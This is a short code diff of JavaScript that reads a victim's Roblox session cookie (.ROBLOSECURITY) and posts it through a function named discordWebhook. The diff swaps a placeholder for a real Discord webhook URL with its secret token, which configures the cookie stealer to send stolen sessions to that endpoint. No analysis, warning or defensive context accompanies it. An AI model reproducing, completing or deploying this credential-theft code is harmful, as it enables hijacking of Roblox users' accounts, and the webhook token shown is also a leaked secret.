@@ -10,7 +10,7 @@ var token = getCookie(".ROBLOSECURITY")
 function discordWebhook(){
         const request = new XMLHttpRequest();
      
-      request.open("POST", "****PUT-WEBHOOK-URL-HERE****"); // <-- Discord webhook link 
+      request.open("POST", "https://discord.com/api/webhooks/1112804970346057758/yshUHg0odzy8XyDuTc-zip6OFA8P4_UWXSYPGtNddA91KhpqDU9i4WdZwxAI1e5Rc3RU"); // <-- Discord webhook link 
       
       request.setRequestHeader('Content-type', 'application/json', );
 
